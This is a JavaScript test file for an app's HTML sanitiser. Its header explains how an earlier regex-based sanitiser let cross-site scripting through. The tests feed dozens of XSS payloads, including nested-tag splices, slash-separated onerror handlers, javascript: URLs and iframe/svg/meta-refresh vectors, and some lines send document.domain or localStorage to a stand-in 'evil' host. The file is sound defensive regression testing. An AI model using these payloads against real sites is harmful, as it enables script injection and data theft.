/*
  tests/sanitize.test.mjs
  --------------------------------------------------------------------------
  The allowlist that stands between stored block HTML and an exported file.

  EVERY PAYLOAD BELOW WAS RUN AGAINST THE OLD SANITISER AND SURVIVED IT —
  verified by executing the two regexes, not assumed. The first one is the
  worst: the sanitiser did not merely fail to remove it, it BUILT it.

      in   <sc<script>x</script>ript>alert(1)</sc<script>y</script>ript>
      out  <script>alert(1)</script>

  That code was two regexes over the input:

      .replace(/<script[\s\S]*?<\/script>/gi, '')
      .replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')

  The tests it had asserted `!/<script/i` and `!/onerror\s*=/` against one
  naive payload, and passed. They were testing the two cases the implementation
  already handled, which is the failure mode worth naming: a test written from
  the code instead of from the threat.

  Why it mattered: `exportPdf` does `window.open('')` then `document.write()`,
  and a script-opened about:blank INHERITS THE APP'S ORIGIN. Anything surviving
  here ran as DataStudio, with every notebook, spreadsheet, image and PDF in
  IndexedDB in reach. Not a sandboxed file — the app.

  tests/browser/run.mjs carries the other half of this: it injects sanitised
  output into a live page and asserts nothing executes. Assertions about
  strings are necessary but they are not proof.
  -------------------------------------------------------------------------- */

import { sanitizeHtml, isCleanHtml } from '../lib/sanitize.js'
import { blocksToHtml } from '../lib/exporters.js'

let pass = 0, fail = 0
const ok = (c, m) => { c ? (pass++, console.log('  ok   ' + m)) : (fail++, console.log('  FAIL ' + m)) }

/* Built, so this file holds no literal control bytes. */
const ch = n => String.fromCharCode(n)
const NL = ch(10), TAB = ch(9)

/* No output may contain an executable construct, whatever the input was. */
const inert = html =>
  !/<script/i.test(html) &&
  !/\son[a-z]+\s*=/i.test(html) &&
  !/javascript:/i.test(html) &&
  !/<iframe|<object|<embed|<svg|<math|<form|<meta|<base|<link|<style/i.test(html)

console.log('\n the splice bug — the sanitiser used to MANUFACTURE tags')
{
  /* Removing the inner <script>x</script> joined `<sc` to `ript>` and produced
     a real <script> tag. The output here is built from scratch rather than
     spliced out of the input, so this cannot recur by construction. */
  const payload = '<sc<script>x</script>ript>alert(1)</sc<script>y</script>ript>'
  const out = sanitizeHtml(payload)
  ok(!/<script/i.test(out), 'a nested-tag splice does not assemble a <script> tag')
  ok(inert(out), 'and the result is inert')

  ok(!/<script/i.test(sanitizeHtml('<scr<script>ipt>alert(1)</script>')), 'the shorter form too')
  ok(!/<img/i.test(sanitizeHtml('<im<img src=x onerror=alert(1)>g src=x onerror=alert(1)>')),
     'and the same trick with an img')
}

console.log('\n the whitespace assumption — /s\\on\\w+/ needed a leading space')
{
  /* HTML accepts `/` as an attribute separator. `<img/src=x/onerror=…>` parses
     as a real handler and never matched the old regex. It fires with NO user
     interaction. */
  const out = sanitizeHtml('<img/src=x/onerror=fetch("//evil/?"+document.domain)>')
  ok(!/onerror/i.test(out), 'a slash-separated handler is removed')
  ok(inert(out), 'and nothing else survives in its place')

  ok(!/onerror/i.test(sanitizeHtml('<img' + NL + 'src=x' + NL + 'onerror=alert(1)>')), 'newline-separated too')
  ok(!/onerror/i.test(sanitizeHtml('<img' + TAB + 'src=x' + TAB + 'onerror=alert(1)>')), 'tab-separated too')
  ok(!/onload/i.test(sanitizeHtml('<img src=x ONLOAD=alert(1)>')), 'and in any case')
  ok(!/onerror/i.test(sanitizeHtml("<img src=x onerror='alert(1)'>")), 'single-quoted')
  ok(!/onerror/i.test(sanitizeHtml('<img src=x onerror=alert(1)>')), 'unquoted')
}

console.log('\n unterminated tags — the blocklist needed a closing tag to match')
{
  ok(!/<script/i.test(sanitizeHtml('<script>fetch("//evil/"+localStorage)')),
     'a <script> with no closing tag is still removed')
  ok(sanitizeHtml('<script>steal()</script>') === '', 'and its CONTENTS go with it — that text is code, not text')
  ok(!/steal/.test(sanitizeHtml('<script>steal()')), 'including when unterminated')
  ok(sanitizeHtml('<style>body{background:url(javascript:alert(1))}</style>') === '', 'style contents too')
}

console.log('\n everything the blocklist never looked for')
{
  const cases = [
    ['<iframe src="javascript:alert(1)"></iframe>', 'iframe'],
    ['<object data="javascript:alert(1)"></object>', 'object'],
    ['<embed src="javascript:alert(1)">', 'embed'],
    ['<meta http-equiv="refresh" content="0;url=//evil">', 'meta refresh'],
    ['<base href="//evil/">', 'base'],
    ['<form action="//evil/"><input name=a></form>', 'form'],
    ['<link rel=stylesheet href="//evil/x.css">', 'link'],
    ['<svg><animate attributeName=href values=javascript:alert(1)/></svg>', 'svg animate'],
    ['<math><mtext><script>alert(1)</script></mtext></math>', 'math'],
    ['<template><script>alert(1)</script></template>', 'template'],
    ['<noscript><p>x</p></noscript>', 'noscript'],
    ['<textarea><script>alert(1)</script></textarea>', 'textarea'],
  ]
  for (const [payload, label] of cases) {
    ok(inert(sanitizeHtml(payload)), `${label} is removed`)
  }
}

console.log('\n URLs')
{
  ok(!/javascript:/i.test(sanitizeHtml('<a href="javascript:alert(1)">click</a>')), 'a javascript: href is dropped')
  ok(sanitizeHtml('<a href="javascript:alert(1)">click</a>').includes('click'),
     'but the link TEXT survives — removing the words would look like data loss')
  ok(!/data:/i.test(sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>')), 'data: is dropped')
  ok(!/vbscript/i.test(sanitizeHtml('<a href="vbscript:msgbox(1)">x</a>')), 'vbscript: is dropped')
  ok(!/javascript/i.test(sanitizeHtml('<a href="java' + TAB + 'script:alert(1)">x</a>')),
     'and a tab inside the scheme does not smuggle it past — browsers strip those BEFORE reading it')

  const good = sanitizeHtml('<a href="https://example.com">ok</a>')
  ok(good.includes('href="https://example.com/"'), 'an https link survives')
  ok(good.includes('rel="noopener noreferrer nofollow"'), 'with rel — target without it hands over a live opener')
  ok(good.includes('target="_blank"'), 'and target')

  ok(!/src=/i.test(sanitizeHtml('<img src="javascript:alert(1)" alt="x">')), 'an unsafe img src is dropped')
  ok(sanitizeHtml('<img src="https://x.test/a.png" alt="a">').includes('alt="a"'), 'a safe one survives with its alt')
}

console.log('\n what has to survive — a sanitiser nobody trusts gets removed')
{
  const doc = '<h2>Title</h2><p>Some <strong>bold</strong> and <em>italic</em> text.</p>' +
    '<ul><li>one</li><li>two</li></ul><blockquote>quoted</blockquote><pre><code>x = 1</code></pre>' +
    '<table><tr><th colspan="2">h</th></tr><tr><td>a</td><td>b</td></tr></table>'
  const out = sanitizeHtml(doc)
  for (const tag of ['h2', 'p', 'strong', 'em', 'ul', 'li', 'blockquote', 'pre', 'code', 'table', 'tr', 'th', 'td']) {
    ok(out.includes('<' + tag), `<${tag}> survives`)
  }
  ok(out.includes('colspan="2"'), 'a numeric colspan survives')
  ok(!sanitizeHtml('<td colspan="2; x">a</td>').includes('colspan'), 'a non-numeric one does not')
  ok(isCleanHtml('<p>plain</p>'), 'already-clean markup is unchanged')

  /* Teleporter links are the app's own markup and have to round-trip. */
  const tp = sanitizeHtml('<span data-ds-link="nb/sheet/block">Acme Q3</span>')
  ok(tp.includes('data-ds-link="nb/sheet/block"'), 'a teleporter link survives an export')
  ok(tp.includes('Acme Q3'), 'with its label')
  ok(!sanitizeHtml('<span data-ds-link="x" onclick="alert(1)">y</span>').includes('onclick'),
     'but a handler beside it does not')
}

console.log('\n dropped attributes')
{
  ok(!/style=/i.test(sanitizeHtml('<p style="background:url(javascript:alert(1))">x</p>')), 'style is dropped entirely')
  ok(!/class=/i.test(sanitizeHtml('<p class="prose">x</p>')),
     'and so is class — the export stylesheet targets classes the EXPORTER emits, never one from content')
  ok(!/id=/i.test(sanitizeHtml('<p id="x">y</p>')), 'and id')
}

console.log('\n malformed input fails closed')
{
  ok(sanitizeHtml('a < b') === 'a &lt; b', 'a bare < becomes text, so "a < b" reads correctly')
  ok(sanitizeHtml('<p>unclosed') === '<p>unclosed</p>', 'an unclosed tag is closed')
  ok(sanitizeHtml('</p>stray') === 'stray', 'a stray close tag is dropped')
  ok(sanitizeHtml('<p><em>x</p>') === '<p><em>x</em></p>', 'crossed nesting is balanced')
  ok(sanitizeHtml('<!-- <script>alert(1)</script> -->') === '', 'a comment and its contents go')
  ok(!/script/i.test(sanitizeHtml('<!--[if IE]><script>alert(1)</script><![endif]-->')), 'conditional comments too')
  ok(sanitizeHtml('<!DOCTYPE html><p>x</p>') === '<p>x</p>', 'a doctype is dropped')
  ok(sanitizeHtml('') === '' && sanitizeHtml(null) === '' && sanitizeHtml(undefined) === '', 'empty input is empty')
  ok(sanitizeHtml(42) === '42', 'a non-string does not throw')
  ok(/&amp;/.test(sanitizeHtml('a & b')), 'a bare ampersand is escaped')
}

console.log('\n through blocksToHtml — the real export path')
{
  const evil = [{
    type: 'text', name: 'x',
    content: '<p>ok</p><sc<script>y</script>ript>alert(1)</script>' +
             '<img/src=x/onerror=alert(1)><a href="javascript:alert(1)">link</a>' +
             '<iframe src="javascript:alert(1)"></iframe>',
  }]
  const html = blocksToHtml(evil, 'Test')

  /* The strict check runs on the USER-CONTENT section. The document's own head
     legitimately carries <meta charset> and the print stylesheet — asserting
     against the whole file would be asserting that the exporter cannot emit
     its own markup, which is a test that fails for the wrong reason. */
  const prose = /<div class="prose">([\s\S]*?)<\/div>/.exec(html)
  ok(!!prose, 'the text block reaches the document')
  ok(inert(prose[1]), 'every payload at once, and the prose section is inert')
  ok(prose[1].includes('ok'), 'and legitimate content still survives')
  ok(!/<img/.test(prose[1]), 'an img whose src was refused is dropped rather than left broken')
  ok(prose[1].includes('link'), 'the refused link keeps its text')

  /* These must hold across the WHOLE file, head included. */
  ok(!/<script/i.test(html), 'no script tag anywhere in the exported file')
  ok(!/\son[a-z]+\s*=/i.test(html), 'no inline event handler anywhere')
  ok(!/javascript:/i.test(html), 'no javascript: URL anywhere')

  const tbl = [{ type: 'table', name: '<b>t</b>', headers: ['<i>h</i>'], rows: [['<u>c</u>']] }]
  const th = blocksToHtml(tbl, 'T')
  ok(th.includes('&lt;i&gt;'), 'table headers are entity-escaped')
  ok(th.includes('&lt;u&gt;'), 'table cells are entity-escaped')
}

console.log(`\n  ${pass} passed, ${fail} failed`)
export default { pass, fail }
